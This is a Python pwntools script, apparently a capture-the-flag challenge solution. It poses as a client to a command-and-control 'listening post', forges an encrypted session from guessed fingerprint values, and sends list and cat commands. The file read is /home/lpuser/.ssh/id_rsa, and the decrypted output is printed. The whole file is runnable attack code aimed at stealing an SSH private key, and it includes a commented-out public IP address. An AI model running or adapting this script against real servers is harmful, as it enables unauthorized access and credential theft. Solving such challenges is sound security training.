# Imports
import time
import hashlib
import base64
import nacl.public
import nacl.secret
import nacl.utils
from magic_constants import *
from pwn import *

# Listening post constants
LP_IP = "127.0.0.1" #"54.85.103.153"
LP_PORT = 0x1a0a
LP_PUBKEY = nacl.public.PublicKey(b"\x2d\x9f\xe3\x94\x38\x49\x08\x17\x5d\x8b\x59\x6d\x3b\xe3\x48\x46\xe8\x7f\xf9\x93\x75\x74\x82\xe1\x3c\x9e\x2c\x96\x24\x01\x0f\x14")

# Constants for fp and session key generation
UUID = b"\xff"*16
VERSION = "0.0.0.0"
USERNAME = "unknown"
TIMESTAMP = str(int(time.time()))
OS = "Linux"

# Generate fingerprint and session key
userb64 = base64.b64encode(bytes("username="+USERNAME, 'utf-8'))
versionb64 = base64.b64encode(bytes("version="+VERSION, 'utf-8'))
osb64 = base64.b64encode(bytes("os="+OS, 'utf-8'))
timestampb64 = base64.b64encode(bytes("timestamp="+TIMESTAMP, 'utf-8'))
SESSION_FP = userb64 + b',' + versionb64 + b',' + osb64 + b',' + timestampb64
SESSION_KEY = hashlib.sha256(bytes("+".join([USERNAME.lower(), VERSION[:7], TIMESTAMP]), 'utf-8')).digest()

# Helper functions for length header and uuid conversion
def get_length_header(length):
    try:
        rand = b"\x80\x00"
        length_header = rand + (0x10000 + length - int.from_bytes(rand, "big")).to_bytes(2, "big")
        return length_header
    except:
        print(length)
        print(rand)
        print(int.from_bytes(rand, "big"))
        print(0x10000 + length - int.from_bytes(rand, "big"))
        print((0x10000 + length - int.from_bytes(rand, "big")).to_bytes(2, "big"))

def get_length(length_header):
    return int.from_bytes(length_header[:2], "big") + int.from_bytes(length_header[2:], "big") - 0x10000

def getUUID(uuid):
    stuff = [(hex(int(b))[2:]).zfill(2) for b in uuid]
    output = ""
    for i, h in enumerate(stuff):
        if i in [4, 6, 8, 10]:
            output += "-"
        output += h
    return output.encode('utf-8')


# Generate initial crypt message
client_secret = nacl.public.PrivateKey.generate()
client_public = client_secret.public_key._public_key

public_box = nacl.public.Box(client_secret, LP_PUBKEY)
nonce = nacl.utils.random(24)
encrypted_fp = public_box.encrypt(SESSION_FP, nonce)
initial_crypt = get_length_header(len(encrypted_fp)) + encrypted_fp

# Define endpoints for ls and cat commands
endpoint_folder = b'/tmp/endpoints\x00'
sshfolder = b'/home/lpuser/.ssh\x00'
sshfile = b"id_rsa\x00"

# Generate messages for init, ls, and cat
init_message = MAGIC_START + PARAM_CMD + b"\x00\x02" + COMMAND_INIT + PARAM_UUID + len(UUID).to_bytes(2, "big") + UUID + MAGIC_END
ls_command = MAGIC_START+PARAM_CMD+CMD_LENGTH+COMMAND_LS+PARAM_UUID+UUID_LENGTH+ UUID + PARAM_DIRNAME+ len(endpoint_folder).to_bytes(2, "big") + endpoint_folder + MAGIC_END
cat_command = MAGIC_START+PARAM_CMD+CMD_LENGTH+COMMAND_CAT+PARAM_UUID+UUID_LENGTH+UUID+PARAM_DIRNAME+len(sshfolder).to_bytes(2, "big") + sshfolder +b'N\x1c'+len(sshfile).to_bytes(2, "big")+sshfile+MAGIC_END
messages = [init_message, ls_command, cat_command]

# Encrypt messages to send to lp
ciphers = []
secret_box = nacl.secret.SecretBox(SESSION_KEY)
for m in messages:
    nonce = nacl.utils.random(0x18)
    c = secret_box.encrypt(m, nonce)
    ciphers.append(get_length_header(len(c)) + c)

# Send messages to lp and print response
socket = remote(LP_IP, LP_PORT)
socket.send(client_public+initial_crypt)
for m in ciphers:
    socket.send(m)
    response_size = get_length(socket.recvn(4))
    response = socket.recvn(response_size)
    response = secret_box.decrypt(response)
    print(response)
